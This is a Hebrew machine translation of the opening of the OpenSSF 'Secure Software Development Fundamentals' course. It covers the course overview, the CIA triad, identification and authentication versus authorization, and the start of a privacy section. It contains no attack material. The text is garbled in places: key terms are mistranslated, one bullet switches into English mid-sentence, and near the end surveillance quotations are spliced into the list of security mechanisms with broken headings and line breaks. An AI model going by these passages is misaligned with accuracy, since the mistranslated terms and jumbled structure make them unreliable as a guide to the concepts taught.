# יסודות פיתוח תוכנה מאובטחת

מאת דייוויד א. וילר

זהו התוכן של שלישיית קורסים בקצב עצמי. משתמשים יכולים ללמוד ממנו בחינם, או להגיש בקשה לתעודת סיום תמורת תשלום.

ל *לקח* הקורס, אנא עבור אל [דף האינטרנט OpenSSF בקורסים יסודות פיתוח תוכנה מאובטחת](https://openssf.org/training/courses/).
אתה יכול גם ללכת ישירות שלה
["פיתוח תוכנה מאובטחת" (LFD121)](https://training.linuxfoundation.org/training/developing-secure-software-lfd121/)
באתר ההדרכה וההסמכה של קרן לינוקס, או באתר ההדרכה וההסמכה שלו
[דף edX](https://www.edx.org/professional-certificate/linuxfoundationx-secure-software-development-fundamentals).
כדי לקבל תוכן זה בתבנית Markdown, עבור אל <https://github.com/ossf/secure-sw-dev-fundamentals>.

חומר זה מחולק ל 3 קורסים קטנים יותר (חלק 1-3) כי צריך לקחת ~ 14-18 שעות בסך הכל:

1.  פיתוח תוכנה מאובטח - חלק א', דרישות, תכנון ושימוש חוזר \[מכסה יסודות, דרישות, עיצוב, שימוש חוזר] - ~ קורס של 2-4 שעות בלבד, ~ 4-5 שעות בסך הכל כולל בדיקות ובדיקת משאבים / קישורים שסופקו

2.  פיתוח תוכנה מאובטחת - חלק ב', הטמעה - ~ קורס של 4-6 שעות בלבד, ~ 5-7 שעות סה"כ

3.  פיתוח תוכנה מאובטחת - חלק III, אימות ונושאים מיוחדים נוספים \[מכסה אימות, מודלים של איומים, קריפטוגרפיה ונושאים מתקדמים אחרים] - ~ קורס של 3-5 שעות בלבד, ~ 5-6 שעות בסך הכל

חומרי למידה אלה (כולל חידוני מקטעים) משוחררים תחת רישיון ייחוס Creative Commons (CC-BY), במיוחד CC-BY-4.0. לכמה תמונות (למשל, מ-XKCD) יש רישיונות שונים והן מצוינות ככאלה. אנחנו לא משחררים את הפרק / בחינות הגמר בדרך זו, מכיוון שזה יעודד רמאות. אם בנסיבות מסוימות אתה בסופו של דבר עם גישה לבחינות אלה, אל תשחרר אותם, בבקשה!

אנחנו יכולים לתקן במהירות טעויות משמעותיות, אבל אחרת אנחנו רוצים ליישם עדכונים רק כל 1-1.5 שנים כדי שהתוכן שלו יישאר יציב יחסית. ניתן להציע שינוי באמצעות <https://github.com/ossf/secure-sw-dev-fundamentals/issues>. תוכן הקורס הזה הותאם עם החומרים שפורסמו ב-edX נכון ל-2020-12-03. LF הדרכה והסמכה קבעה, מניסיון, כי זה בטוח יותר ואמין יותר לכתוב / לערוך תוכן בפלטפורמה אחרת ולאחר מכן להמיר אותו edX (כלומר, במקום אל תחזור על עצמך (DRY) זה בטוח יותר לכתוב הכל פעמיים (WET)), אז זה התהליך שבו אנו משתמשים. המסמך המקורי פותח באמצעות מסמכי גוגל; פורמטים אחרים הם תרגומים, שעשויים לכלול שגיאות תרגום.

גישת הלמידה נועדה לתמוך פוטנציאלית במשתמשים רבים (עם פוטנציאל של 10-15 מיליון), ולכן כל הבעיות (כולל בדיקות ידע) חייבות להיות אוטומטיות לחלוטין. אין תוכניות להשתמש בקבוצות, דיונים או כל דבר אחר שדורש מדריכים אנושיים (כי זה לא מתרחב טוב). ברוב המקרים בדיקות הידע הן 1-2 שאלות אמריקאיות. בדרך כלל יהיה להם אקראי *הזמנה* של תשובות, אך לא אקראיות *ערכים* של תשובה (אין תסריט פייתון מעורב).

**הדרכת תורמים**

מסמך זה נכתב כדי להיות מובן בקלות על ידי הקהל שלה (במקרה זה, מפתחי תוכנה). באופן כללי, במסמך זה:

*   השתמשו בצירים (אלא אם כן אתם רוצים דגש מיוחד על משהו).
*   השתמש בציטוט לוגי, לא בציטוט טיפוגרפי. הציטוטים כוללים רק את מה שמצוטט. לקבלת מידע נוסף, ראה [ויקיפדיה: ציטוט לוגי בוויקיפדיה](https://en.wikipedia.org/wiki/Wikipedia:Logical_quotation_on_Wikipedia).
*   השתמש בכינויים, במיוחד *אתה*.
*   השתמש בפסיקים של אוקספורד.
*   ציטטו מקורות.

לקבלת מידע נוסף, ראה [5 כללי דקדוק מטופשים שלעולם לא כדאי לך לעקוב אחריהם מכיוון שהם מחמירים את הכתיבה שלך](https://www.inc.com/minda-zetlin/5-stupid-grammar-rules-you-should-never-follow-because-they-make-your-writing-wo.html) ו [6 אמונות טפלות של דקדוק: הכללים לעולם לא](https://wac.colostate.edu/docs/books/grammar/chapter6.pdf).

שים לב ש- edX דורש קבוצות בשלוש רמות: מקטעים, סעיפי משנה ויחידות. רק יחידות (רמה 3) יכולות להכיל תוכן.  אנו מייצגים זאת בחומר שלהלן באופן הבא: "כותרת 1" מייצגת את תחילתו של מקטע ומכילה רק רצפים המתחילים ב"כותרת 2" (ללא טקסט). "כותרת 2" מייצגת את תחילתו של תת-סעיף ומכילה רק רצפים המתחילים ב-"כותרת 3". "כותרת 3" מייצגת את תחילתה של יחידה ומכילה את כל התוכן. לא ניתן לכלול ישירות כותרת 3 בתוך כותרת 1. כותרת 4 (ומטה) משמשת באופן חופשי בתוך יחידה. מבחינה טכנית, חידונים הם ברמה 3 ב-edX, אך הם מיוצגים כרמה 4 בסימון מכיוון שהחידונים הם חלק לוגי מהקטע שהם בוחן.

התוכן העיקרי הניתן לעריכה הוא בתבנית markdown. לא אמורות להיות שגיאות סימון באמצעות התצורה שלנו. באפשרותך להוסיף היפר-קישורים למקטעים פנימיים כ #<i>section_name</i> איפה <i>section_name</i> היא הכותרת שהשתנתה באמצעות GitHub [`gfm_auto_identifiers`](https://pandoc.org/MANUAL.html#extension-gfm_auto_identifiers) אלגוריתם: המרחב הופך `-`אותיות רישיות (ASCII) הופכות לאותיות קטנות, וסימני פיסוק (מלבד `-` ו `_`) יוסרו.

**אודות הקורס (חלק 1)**

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך מפתחי תוכנה רבים מעולם לא נאמר להם כיצד להתמודד ביעילות עם התקפות אלה. קורס זה פועל כדי לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחי תוכנה, אנשי DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים, כדי לשפר את אבטחת המידע. קורס זה יאפשר למפתחי תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות, ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות כל פגיעויות סמויות.

קורס זה דן ביסודות האבטחה, כגון המשמעות האמיתית של ניהול סיכונים. הוא דן באופן שבו יש להתייחס לאבטחה כחלק מהדרישות של מערכת, ואילו דרישות אבטחה פוטנציאליות אתה עשוי לשקול. לאחר מכן, חלק זה דן באופן שבו ניתן לעצב תוכנה כך שתהיה מאובטחת, כולל עקרונות עיצוב מאובטחים שונים שיעזרו לך להימנע מעיצובים גרועים ולאמץ עיצובים טובים. הוא גם דן כיצד לאבטח את שרשרת אספקת התוכנה שלך, כלומר, כיצד לבחור ולרכוש באופן מאובטח יותר תוכנות בשימוש חוזר (כולל תוכנות קוד פתוח) כדי לשפר את האבטחה.

זהו הראשון מבין שלושת הקורסים בתוכנית התעודה המקצועית של יסודות פיתוח תוכנה מאובטחת, והוא פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת המערכת האקולוגית של הקוד הפתוח. קורסי ההכשרה הכלולים בתוכנית זו מתמקדים בצעדים מעשיים שאתה (כמפתח) יכול לנקוט כדי להתמודד עם רוב סוגי ההתקפות הנפוצים.

**מה תלמד (חלק 1)**

<ul>
<li>Security basics: risk management, the “CIA” triad, and requirements.</li>
<li>Secure design principles: what are principles such as “least privilege” and how to apply these principles.</li>
<li>Supply chain evaluation: tips on how to choose packages to reuse, and how to reuse them so that you can rapidly be alerted & update.</li>
</ul>

**אודות קורס זה (חלק 2)**

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך מפתחי תוכנה רבים מעולם לא נאמר להם כיצד להתמודד ביעילות עם התקפות אלה. קורס זה פועל כדי לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחי תוכנה, אנשי DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים לשיפור אבטחת המידע. קורס זה יאפשר למפתחי תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות, ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות כל פגיעויות סמויות.

קורס זה מתמקד בסוגיות יישום מרכזיות: אימות קלט (כגון מדוע יש להשתמש ברשימות מתירים ולא בדניליסטים), עיבוד נתונים בצורה מאובטחת, קריאה לתוכניות אחרות, שליחת פלט וטיפול בשגיאות. הוא מתמקד בצעדים מעשיים שאתה (כמפתח) יכול לנקוט כדי להתמודד עם סוגי ההתקפות הנפוצים ביותר.

זהו הקורס השני מבין שלושת הקורסים בתוכנית התעודה המקצועית של יסודות פיתוח תוכנה מאובטחת, והוא פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת המערכת האקולוגית של הקוד הפתוח.

**מה תלמד (חלק 2)**

<ul>
<li>Implementation: You’ll learn how to implement much more secure software. This includes how to do Input validation, process data securely, call out to other programs, and send output. You’ll also learn about more specialized approaches, including some basics of cryptography and handling problems (such as error-handling code).</li>
</ul>

**אודות הקורס (חלק 3)**

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך מפתחי תוכנה רבים מעולם לא נאמר להם כיצד להתמודד ביעילות עם התקפות אלה. קורס זה פועל כדי לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחי תוכנה, אנשי DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים לשיפור אבטחת המידע. קורס זה יאפשר למפתחי תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות, ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות כל פגיעויות סמויות.

קורס זה דן כיצד לאמת תוכנה לצורך אבטחה. בפרט, הוא דן בגישות השונות של ניתוחים סטטיים ודינמיים, כמו גם כיצד ליישם אותן (למשל, בצינור אינטגרציה רציף). הוא גם דן בנושאים מיוחדים יותר, כגון היסודות של איך לפתח מודל איום וכיצד ליישם יכולות קריפטוגרפיות שונות.

זהו השלישי מבין שלושת הקורסים בתוכנית התעודה המקצועית של יסודות פיתוח תוכנה מאובטחת, והוא פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת המערכת האקולוגית של הקוד הפתוח. קורסי ההכשרה הכלולים בתוכנית זו מתמקדים בצעדים מעשיים שאתה (כמפתח) יכול לנקוט כדי להתמודד עם רוב סוגי ההתקפות הנפוצים.

**מה תלמד (חלק 3)**

<ul>
<li>Security Verification: How to examine software, include some key tool types, and how to apply them in continuous integration (CI). This includes learning about security code scanners/static application security testing (SAST) tools, software composition analysis (SCA)/dependency analysis tools, fuzzers, and web application scanners.</li>
<li>Threat modeling/Attack modeling: How to consider your system from an attacker’s point of view and how to apply a simple design analysis approach called STRIDE.</li>
<li>Fielding: How to deploy and operate secure software, handle vulnerability reports, and how to rapidly update when reused components have publicly-known vulnerabilities.</li>
<li>Assurance cases & formal methods: The basics of approaches to more strongly analyze and justify that your software is secure.</li>
</ul>

**פגוש את המדריך שלך**

דיוויד א. וילר<br>
מנהל אבטחת שרשרת אספקה בקוד פתוח בקרן לינוקס<br>
ד"ר דיוויד א. וילר הוא מומחה בפיתוח תוכנה מאובטחת ובתוכנות קוד פתוח (OSS). הוא מנהל אבטחת שרשרת האספקה בקוד פתוח בקרן לינוקס ומלמד קורסים לתארים מתקדמים בפיתוח תוכנה מאובטחת באוניברסיטת ג'ורג' מייסון (GMU) בפיירפקס, וירג'יניה. יש לו דוקטורט בטכנולוגיית מידע, תואר שני במדעי המחשב, תעודה באבטחת מידע, תעודה בהנדסת תוכנה ותואר ראשון בהנדסת אלקטרוניקה. הוא גם מומחה מוסמך לאבטחת מערכות מידע (CISSP) וחבר בכיר ב-IEEE. הוא מוביל את פרויקט תג שיטות העבודה המומלצות של קרן אבטחת הקוד הפתוח (OpenSSF) עבור קרן לינוקס ושימש כמאמת מוביל עבור שותפות אבטחת המידע הלאומית (NIAP) עבור הקריטריונים הנפוצים (אבטחה). הוא מתגורר בצפון וירג'יניה.

# תוכן עניינים

\[\[תוכן עניינים]]

# חלק א': דרישות, תכנון ושימוש חוזר

# מבוא לקורס

## מבוא

*למד את יסודות האבטחה המאפשרים לך לפתח תוכנה המוקשחת מפני התקפות, והבן כיצד תוכל להפחית את הנזק ולהאיץ את התגובה כאשר פגיעות מנוצלת לרעה.*

התוכנה המודרנית נמצאת תחת מתקפה מתמדת, אך מפתחי תוכנה רבים מעולם לא נאמר להם כיצד להתמודד ביעילות עם התקפות אלה. קורס זה פועל כדי לפתור בעיה זו, על ידי הסבר היסודות של פיתוח תוכנה מאובטחת. קורס זה, המיועד למפתחי תוכנה, אנשי DevOps, מהנדסי תוכנה, מפתחי יישומי אינטרנט ואחרים המעוניינים ללמוד כיצד לפתח תוכנה מאובטחת, מתמקד בצעדים מעשיים שניתן לנקוט, גם עם משאבים מוגבלים, כדי לשפר את אבטחת המידע. קורס זה יאפשר למפתחי תוכנה ליצור ולתחזק מערכות שקשה הרבה יותר לתקוף בהצלחה, להפחית את הנזק כאשר ההתקפות מצליחות, ולהאיץ את התגובה כך שניתן יהיה לתקן במהירות כל פגיעויות סמויות.

הקורס דן בסיכונים ודרישות, עקרונות תכנון והערכת קוד (כגון חבילות) לשימוש חוזר. לאחר מכן הוא מתמקד בנושאי יישום מרכזיים: אימות קלט (כגון מדוע יש להשתמש ברשימות מותרות ולא ברשימות נדחות), עיבוד נתונים בצורה מאובטחת, קריאה לתוכניות אחרות, שליחת פלט, קריפטוגרפיה, טיפול בשגיאות ותגובה לתקריות. לאחר מכן מתקיים דיון בסוגיות אימות מסוגים שונים, כולל בדיקות, כולל בדיקות אבטחה ובדיקות חדירה, וכלי אבטחה. הוא מסתיים בדיון על פריסה וטיפול בדוחות פגיעות.

ה *יסודות פיתוח תוכנה מאובטחת* הקורס פותח על ידי קרן אבטחת הקוד הפתוח (OpenSSF), פרויקט של קרן לינוקס המתמקד באבטחת המערכת האקולוגית של הקוד הפתוח. הקורס מתמקד בצעדים מעשיים שאתה (כמפתח) יכול לנקוט כדי להתמודד עם רוב סוגי ההתקפות הנפוצים.

## הערת המחבר

תודתנו לאנשים הרבים שסיפקו פרשנות ועצות מועילות. אנו מודים במיוחד לפול א. בלאק (NIST), סטיב ליפנר (SAFECode), דן לורנץ (גוגל), שריף מנסור (OWASP), יאניק מוי (AdaCore) ואשווין רמסוואמי על המלצותיהם המתחשבות והספציפיות.

## מוטיבציה

### מוטיבציה: מדוע חשוב לאבטח תוכנה?

בכל יום יש חדשות על פריצה למערכות מחשב, לעתים קרובות באמצעות נקודות תורפה שונות בתוכנה. תוכנה לא מאובטחת עשויה:

*   שחרור מידע פרטי/סודי (aka *"לאבד סודיות"*)

*   לאבד או להשחית מידע (aka "*לאבד יושרה*")

*   לאבד שירות (aka *"לאבד זמינות"*).

אבל הבעיות לא נגמרות שם. כל אחד מאלה יכול לגרום *העולם האמיתי* הפסדים. הם יכולים לעלות כסף, זמן, אמון ואפילו חיים.

עם זאת, לעתים קרובות אף פעם לא אומרים למפתחים כיצד לפתח תוכנה מאובטחת. אנחנו צריכים *מצפה* שמפתחים שלעולם לא נאמר להם איך לעשות משהו יתקשו לעשות זאת.

קורס זה מתמקד בסיוע לך להבין כיצד לפתח תוכנה מאובטחת באופן מעשי. באמצעות *תוכנה מאובטחת* אנו מתכוונים לתוכנה:

*   שהרבה יותר קשה לתוקפים לנצל,

*   שמגביל את הנזק אם הניצול מצליח, ו

*   שבו ניתן לתקן פגיעויות ולנצל אותן באופן חלקי במהירות יחסית.

### מוטיבציה: למה לקחת את הקורס הזה?

הדאגה העיקרית שלנו היא שתלמדו כיצד להתפתח *מאובטח* תוכנה. הנה כמה מהתכונות והיתרונות של הקורס הספציפי הזה:

1.  **חידונים**. אנו שואלים שאלות חידון לאורך הדרך כדי לעזור לחזק מושגים. קל להתנתק מהספרים והסרטונים המסורתיים, מתוך מחשבה שאתה מבין את מושגי הליבה גם כשאינך עושה זאת. לעומת זאת, החידונים עוזרים לחזק את מושגי הליבה כך שתבינו אותם.

2.  **חינם**. אם אתה רק רוצה ללמוד, זה לא עולה כלום! כל מה שאתה צריך זה חיבור לאינטרנט. לאנשים רבים יש משאבים מוגבלים ואנחנו רוצים לוודא שהמידע הזה זמין להם.

3.  **תוכן פתוח**. החומר האינפורמטיבי העיקרי הוא לא רק "חופשי" במובן של "ללא עלות" אלא גם במונחים של חופש. בפרט, התוכן האינפורמטיבי משוחרר תחת [רישיון ייחוס קריאייטיב קומונס (CC-BY) גרסה 4.0](https://creativecommons.org/licenses/by/4.0/)כך שתוכלו לעשות בו שימוש חוזר בדרכים רבות., אנחנו *רצה* אתה צריך להשתמש במידע זה! יש כמה יוצאים מן הכלל; אנו מצטטים חומרים אחרים (כגון מ- XKCD) הנמצאים תחת רישיונות משלהם.

4.  **עדות להשלמה**. אם אתה רוצה להוכיח שלמדת את החומר (בניגוד פשוט לראות טקסט כלשהו), זה זמין. הלומדים המשתתפים בקורס בפלטפורמת ההדרכה של קרן לינוקס יידרשו לעבור מבחן מסכם על מנת להשלים את הקורס; הם יקבלו תעודת סיום ויקבלו גם תג דיגיטלי, אותו ניתן לשתף באמצעות מדיה חברתית כדי להציג את הידע שלהם. ב- edX עדות זו להשלמה זמינה במחיר סמלי על ידי הרשמה למסלול מאומת. זה באמת יכול לעזור לך לתקשר את מה שאתה יודע למעסיקים, לקוחות או מעסיקים פוטנציאליים. לשם השוואה, עצם הבעלות על ספר לא מוכיחה שקראתם או הבנתם אותו.

5.  **נגישות**. פעלנו כדי להנגיש את המידע הזה. אנחנו רוצים לוודא שמי שעיוור, לקוי ראייה, עיוורון צבעים וכן הלאה יוכל ללמוד מהחומר הזה.

6.  **ישים לתוכנת קוד פתוח (OSS)**. חומרים רבים על אבטחה אינם מקדישים זמן משמעותי ל- OSS, או שקשה ליישם אותם בעת פיתוח OSS. עם זאת, OSS הוא המפתח לפיתוח תוכנה מודרני. אנו כוללים מידע במיוחד עבור אלה המפתחים ו / או משתמשים ב- OSS.

7.  **ללא תלות בגודל הארגון**. אנחנו לא דורשים ממך להיות בארגון פיתוח תוכנה גדול או קטן. חלק מהקורסים מניחים במרומז שאתה נמצא בארגון פיתוח תוכנה גדול.

8.  **ללא תלות בשפת התכנות**. רוב מפתחי התוכנה משתמשים במספר שפות תכנות או יעברו את הקריירה שלהם. לאור זאת, קורס זה מספק בסיס בסיסי בפיתוח תוכנה מאובטחת החלה על *הרבה* שפות תכנות. נשתמש בדוגמאות משפות תכנות ספציפיות, אך אנו רוצים שיהיה לך בסיס איתן, לא משנה במה תשתמש - עכשיו או בעתיד. עליך להשלים מידע זה עם חומרים עבור השפה או המסגרת הספציפית שבה אתה משתמש, אך קורס זה ייתן לך את אבני הבניין העיקריות להבנה וליישום של חומרים אחרים אלה.

9.  **מעשי**. קורס זה מתמקד ב *מעשי* עצות לאנשים שמפתחים תוכנה. בפרט, אנו ממליצים על דברים ספציפיים לעשות או להימנע מהם וכו '. הוא דן בקצרה מדוע עצה זו חלה, אבל זה לא קורס לתואר שני; אנו מתמקדים יותר ב *מה* לעשות במקום כל התיאוריה או הפרטים הטכניים שמאחוריה.

ישנם חומרים אחרים שיכולים לספק מידע על אבטחת תוכנה. הנה כמה חלופות ראויות וניגוד להן:

1.  ה [*הנדסת אבטחה*](https://www.cl.cam.ac.uk/~rja14/book.html) ספרו של רוס אנדרסון מתמקד במערכות בכללותן, כולל חומרה ותהליכים עסקיים, ומתמקד בדאגות של התמונה הגדולה. עם זאת, ספר זה אינו מכסה את רוב הפרטים של איך ליישם תוכנה מאובטחת. לעומת זאת, קורס זה (בניגוד לספרו של רוס אנדרסון) מקפיד לזהות ולדון כיצד להתמודד עם הסוגים הנפוצים ביותר של פגיעויות אבטחה.

2.  [SAFEחומרי הדרכה](https://safecode.org/training/). ל-SAFECode יש מספר חומרי הדרכה זמינים. חלק מהחומרים טובים למדי והם סרטונים (בעוד שהקורס הזה הוא בעיקר טקסט). שים לב שרבים מהחומרים שלהם ממוקדים לעתים קרובות באופן צר. לדוגמה, הקורס שלהם *"סקריפטים חוצי אתרים (XSS) 101"* הוא על סוג נפוץ אחד של פגיעות, ו *"תכנות Java מאובטח 101"* חל רק על שפה אחת. בדוק את התאריכים, מכיוון שחומרים מסוימים עשויים להיות לא מעודכנים. עם זאת, אם החומרים שלהם תואמים את מה שאתה רוצה, הם בהחלט חלופות ראויות.

3.  [מסגרת הידע של אבטחת OWASP (OWASP-SKF)](https://www.securityknowledgeframework.org/). "OWASP-SKF הוא יישום אינטרנט בקוד פתוח שמסביר עקרונות קידוד מאובטחים במספר שפות תכנות. המטרה של OWASP-SKF היא לעזור לך ללמוד ולשלב אבטחה על ידי עיצוב בפיתוח התוכנה שלך ולבנות יישומים מאובטחים על ידי עיצוב. OWASP-SKF עושה זאת באמצעות פרויקטים של פיתוח תוכנה הניתנים לניהול עם רשימות פעולות לביצוע (באמצעות [OWASP-ASVS](https://owasp.org/www-project-application-security-verification-standard/)/[OWASP-MASVS](https://owasp.org/www-project-mobile-security-testing-guide/)  או רשימות תיוג מותאמות אישית לאבטחה) ומעבדות לתרגול אימות אבטחה (באמצעות SKF-Labs, [OWASP חנות מיצים](https://owasp.org/www-project-juice-shop/)ודוגמאות קוד של שיטות עבודה מומלצות מ- SKF ו- [OWASP-Cheatsheets](https://cheatsheetseries.owasp.org))." לעומת זאת, קורס זה (בניגוד ל-OWASP-SKF) אינו דורש פרויקטים ומעבדות של פיתוח תוכנה.

בחר את החומר שיספק לך את המידע שאתה רוצה ללמוד, ואתה בהחלט יכול להשתמש בכולם אם תרצה.

עם זה, בואו נתחיל.

# יסודות האבטחה

פרק זה מספק סקירה כללית ברמה גבוהה אודות אבטחה, כולל הגדרות של אבטחה ופרטיות, דרישות וניהול סיכונים.

מטרות הלמידה:

1.  הסבר מה המשמעות של אבטחה והבן סוגים נפוצים של דרישות אבטחה.

2.  דונו מהי פרטיות, חשיבותה ודרישות הפרטיות שלה.

3.  דונו בניהול סיכונים.

4.  דונו בהגנה לרוחבה וכיצד ליישם מושגי אבטחה בתהליכי פיתוח תוכנה שונים.

5.  להבין את החשיבות של *הגנה, זיהוי ותגובה*.

6.  הסבר את היסודות של טיפול בפגיעויות.

## מה אנחנו צריכים?

### מה פירוש "אבטחה"?

כדי לקבל תוכנה מאובטחת, עלינו להבין תחילה מה *ביטחון* אומר. לתוכנות שונות יש דרישות אבטחה ספציפיות שונות, אך אנשים רבים מחלקים את דרישות האבטחה לשלוש מטרות רחבות - סודיות, יושרה וזמינות:

*   **סודיות**<br>"אין קריאה לא מורשית" - משתמשים רשאים לקרוא רק את המידע שהם מורשים לקרוא.

*   **יושרה**<br>"אין שינוי בלתי מורשה (כתיבה או מחיקה)" - משתמשים רשאים לשנות רק את המידע שהם מורשים לשנות; השינוי כולל תוספות, שינויים ומחיקות.

*   **זמינות**<br>"ממשיך לעבוד בנוכחות התקפה." - התוכנה ממשיכה לעבוד בזמן התקיפה. התקפת מניעת שירות (DoS) היא התקפה שמנסה להפוך את התוכנה ללא זמינה עוד.

קבוצה זו של סודיות, יושרה וזמינות (CIA) נקראת לעתים שלישיית ה-CIA.

![CIA Triad](cia.png)

שלישיית ה-CIA

רבים מוסיפים עוד מטרת אבטחה אחת: **אי-התכחשות** או **דין וחשבון**. הנקודה של אי-התכחשות או דין וחשבון היא שאם מישהו נוקט בפעולות מסוימות, המערכת אמורה להיות מסוגלת להוכיח זאת מאוחר יותר, גם אם האדם המעורב מכחיש זאת מאוחר יותר. דוגמאות לפעולות כאלה הן העברת סכום כסף גדול, מחיקת משהו חשוב, שליחת הודעה חשובה או קבלת הודעה חשובה. למערכות מסוימות אין דרישות כאלה, וגם כאשר הן עושות זאת, יש אנשים הרואים בכך מקרה מיוחד של יושרה. יש אנשים שמוסיפים גם מטרות אחרות. לא משנה איך אתה מסווג דברים, חשוב לדעת בבירור מה המערכת אמורה לעשות. כמה קטגוריות פשוטות יכולות לעזור לך לעשות זאת.

מטרות אבטחה אלה זקוקות לכמה מנגנונים תומכים. לדוגמה, סודיות ויושרה דורשים שתהיה דרך לקבוע אם פעולה מורשית (אלא אם כן כל הבקשות מאושרות). הנה כמה מנגנוני תמיכה נפוצים:

*   **זיהוי ואימות (I\&A)**<br>לדרוש מהמשתמשים להזדהות ולהוכיח (לאמת) את זהותם לפני ביצוע כל פעולה הדורשת הרשאה. לדוגמה, הם עשויים להשתמש בשם משתמש או בכתובת דואר אלקטרוני בתור הזהות שלהם, ולהשתמש בסיסמה או באסימון חומרה כדי לאמת שהם באמת משתמשים אלה. זה נעשה בדרך כלל על ידי תהליך התחברות.

*   **ההרשאות**<br>קבע מה מותר למשתמש (מורשה) לעשות לפני שתחליט לעשות זאת. אתה יכול לחשוב על הרשאה כרשימה של מה שכל משתמש רשאי לעשות. אם קל לתוקף להוסיף הרשאות, אז I\&A מאובטח אומר מעט. זה קריטי ליישום סודיות ו/או יושרה. תיזהר: המילים *אימות* ו *ההרשאות* sound similar, but they are not the same thing. You may know exactly who someone is (authentication), but still not allow that person to do something (authorization).

*   **אנשים שאומרים, **"אם אתה עושה משהו שאתה לא רוצה שאנשים אחרים ידעו, אולי אתה לא צריך לעשות את זה מלכתחילה"<br> עוסקים בהוצאה עצמית קיצונית; 

"מה שהם בעצם אומרים זה 'הסכמתי להפוך את עצמי לאדם כל כך לא מזיק ולא מזיק ולא מעניין, שאני ממש לא חושש שהממשלה תדע מה אני עושה'".

#### רבים מאותם אנשים \[המעלים טענות אלה] אינם פועלים למעשה בדרך זו, למשל, הם ינקטו צעדים רבים כדי להשיג פרטיות לעצמם.

"יש סיבה שכל כך משתוקקים לפרטיות באופן אוניברסלי ואינסטינקטיבי... כאשר אנו נמצאים במצב שבו ניתן לעקוב אחרינו, שבו ניתן לצפות בנו, ההתנהגות שלנו משתנה באופן דרמטי... יש עשרות מחקרים פסיכולוגיים שמוכיחים שכשמישהו יודע שאפשר לצפות בו, ההתנהגות שהוא עוסק בה היא הרבה יותר קונפורמיסטית ותואמת".

"מעקב המוני יוצר כלא בתודעה שהוא אמצעי הרבה יותר מתוחכם אם כי הרבה יותר יעיל לטיפוח ציות לנורמות חברתיות או לאורתודוקסיה חברתית, הרבה יותר יעיל ממה שכוח הזרוע יכול להיות אי פעם".

"חברה שבה ניתן לפקח על אנשים בכל עת היא חברה שמגדלת קונפורמיות וציות וכניעה, ולכן כל עריץ, הגלוי ביותר עד המעודן ביותר, משתוקק למערכת זו".

"כשאנחנו מאפשרים לחברה להתקיים שבה אנחנו נתונים לניטור מתמיד, אנחנו מאפשרים למהות החופש האנושי להיפגע קשות".

"מערכת של מעקב המוני מדכאת את החופש שלנו בכל מיני דרכים. זה הופך את כל מיני בחירות התנהגותיות מחוץ לתחום בלי שאנחנו אפילו יודעים שזה קרה".

דרישות פרטיות

הגישה הפשוטה ביותר: אל תאסוף מידע אישי

### הצעד הראשון לטיפול בפרטיות הוא הכרה בכך שפרטיות היא חשובה, ולאחר מכן לשקול כיצד להבטיח שהתוכנה שלך מספקת פרטיות מספקת אם היא אוספת מידע על אנשים.

הגישה הפשוטה ביותר לפרטיות, ולעתים קרובות נקודת ההתחלה הטובה ביותר, היא 

לא

 לאסוף מידע על אנשים אלא אם כן אתה צריך את זה. אם אינך אוסף את המידע, אינך יכול לחשוף אותו מאוחר יותר, ואינך צריך לקבוע כיצד למנוע שימוש לרעה בו. ביטול זה הכי טוב מנקודת מבט של פרטיות.

אם לא תצליחו בכך, צמצמו את המידע האישי למה שאתם בהחלט דורשים. אם אתה חייב לאסוף מידע על אנשים, עליך לספק להם מגוון הגנות, לכל הפחות אלה הנדרשות על פי חוק ורגולציה. זה יכול להיות מסובך, כי חוקים ותקנות רבים עשויים לחול.*חוקים ותקנות בנושא פרטיות*חוקים ותקנות הנוגעים לפרטיות נפוצים. מונחים שונים משמשים עבורם, כולל פרטיות מידע, פרטיות נתונים והגנה על נתונים. השאלה אם חוקים ותקנות אלה משפיעים על התוכנה שלך או לא, תלויה בסוג הנתונים שהתוכנה שלך אוספת. במקרים רבים, תוכנה לא צריכה לעשות שום דבר מיוחד עבור פרטיות. עם זאת, במקרים אחרים חוקים ותקנות אלה יכולים להיות חשובים מאוד.

סעיף 17 לאמנה הבינלאומית בדבר זכויות אזרחיות ומדיניות של האומות המאוחדות

 בשנת 1966 אושררה באופן נרחב ומגנה על הפרטיות. כתוב, *"לא יהיה אדם נתון להתערבות שרירותית או בלתי חוקית בפרטיותו, במשפחתו, בביתו או בתכתובתו, ולא להתקפות בלתי חוקיות על כבודו ועל שמו הטוב. כל אדם זכאי להגנה של החוק מפני התערבות או התקפות כאלה".*למדינות שונות, ולמחוזות/מדינות בתוך מדינות, יש חוקים שונים בנוגע לפרטיות. כאן נדון בקצרה בגישות ארה"ב ואירופה.

